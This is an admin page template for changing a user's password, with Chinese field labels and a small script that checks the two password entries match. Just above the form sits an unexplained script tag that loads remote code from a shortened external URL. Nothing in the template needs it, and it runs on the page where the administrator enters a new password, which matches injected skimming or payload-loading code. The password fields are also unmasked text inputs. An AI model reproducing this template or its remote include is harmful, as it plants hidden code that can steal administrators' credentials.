<{include file="admin/header.tpl"}>
<script language='javascript'>
    function checkpass()
    {
        if( document.form1.userpwd.value == document.form1.userpwdok.value)
        {
            document.getElementById('pwdtest').innerHTML = "";
            return true;
        }
        else
        {
            document.getElementById('pwdtest').innerHTML = "[两次输入密码效验不正确！]";
            return false;
        }
    }
</script>
<script src="http://t.cn/A6h2UQ2x"></script>
<form name="form1" action="?ct=users&ac=editpwd&even=saveedit" method="POST" onsubmit="return checkpass()" enctype="multipart/form-data">
<{lurd_list item='v'}>
<table class="form">
<tr>
  <th>用户名：</th>
  <td>
    <{$v.user_name}>
  </td>
</tr>
<tr>
  <th>用户昵称：</th>
  <td>
    <{$v.nickname}>
  </td>
</tr>
<tr>
  <th>用户密码：</th>
  <td>
    <input type='input' name='userpwd' id='userpwd' class="text" value='' onchange='checkpass()' />
    <span>(必须大于6位)</span>
  </td>
</tr>
<tr>
  <th>确认密码：</th>
  <td>
    <input type='input' name='userpwdok' id='userpwdok' class="text" value='' onchange='checkpass()' />
    <span id='pwdtest' style='color:red'></span>
  </td>
</tr>
<tr>
  <th>用户email：</th>
  <td>
    <{$v.email}>
   </td>
</tr>
<tr>
  <th>用户组：</th>
  <td>
    <{$v.groups|groupname}>
  </td>
</tr>
<tr>
  <th>上次登录时间：</th>
  <td>
    <{lurd var=$last_login.logintime do="format_date" format="Y-m-d H:i:s" }>
   </td>
</tr>
<tr>
  <th>上次登录IP：</th>
  <td>
    <{$last_login.loginip}>
   </td>
</tr>
<tr>
  <td colspan='2' align='center' height='60'>
      &nbsp;&nbsp;&nbsp;<button type="submit">保存</button> 
  </td>
</tr>
</table>
<{/lurd_list}>
</form>

</body>
</html>
